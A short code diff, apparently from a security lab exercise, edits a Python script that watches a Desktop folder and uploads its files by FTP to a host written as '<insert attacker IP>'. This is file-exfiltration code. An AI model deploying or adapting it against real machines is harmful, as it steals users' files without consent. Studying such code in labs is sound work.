@@ -16,14 +16,14 @@ def listener(folder):
             p.start()
 def send_file(path):
     ftp = FTP()
-    ftp.connect('192.168.1.194', 2121)
+    ftp.connect('<insert attacker IP>', 2121)
     ftp.login('anonymous','password')
     #ftp.cwd('/sambashare') # ftp root
     fp = open(path, 'rb')
     ftp.storbinary('STOR %s' % os.path.basename(path), fp, 1024)
     fp.close()
 def main():
-    p = Process(target=listener,args=("/root/Desktop",))
+    p = Process(target=listener,args=("/home/seed/Desktop",))
     p.start()
 
 
